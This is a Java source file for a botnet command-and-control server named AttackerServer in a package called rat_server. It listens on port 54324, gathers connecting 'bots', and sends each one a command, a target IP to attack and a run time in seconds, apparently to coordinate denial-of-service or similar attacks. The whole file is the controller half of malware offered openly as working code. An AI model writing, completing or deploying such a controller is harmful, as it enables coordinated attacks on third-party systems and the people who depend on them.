package rat_server;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class AttackerServer
{
    private ServerSocket serverSocket;
    private ArrayList<Socket> bots;

    public AttackerServer()
    {
        bots=new ArrayList<>();
        try
        {
            serverSocket=new ServerSocket(54324);
        }
        catch(IOException exc)
        {
            
        }
        new Thread(new Runnable()
        {

            @Override
            public void run() {
               while(true)
                   try
                   {
                    bots.add(serverSocket.accept());
                   }
                   catch(IOException exc)    
                   {
                   
                   }
            }
            
            
        }).start(); 
    }
    
    void sendCommandToAll(String command,String ip_to_attack,int secondsToRun)
    {
        for(int i=0;i<bots.size();i++)
        {
            try
            {
                ObjectOutputStream oos=new ObjectOutputStream(bots.get(i).getOutputStream());
                oos.writeUTF(command);
                oos.flush();
                oos.writeUTF(ip_to_attack);
                oos.flush();
                oos.writeInt(secondsToRun);
                oos.flush();
                oos.close();
            }
            catch(IOException exc)
            {
                
            }
        }
    }
    
}
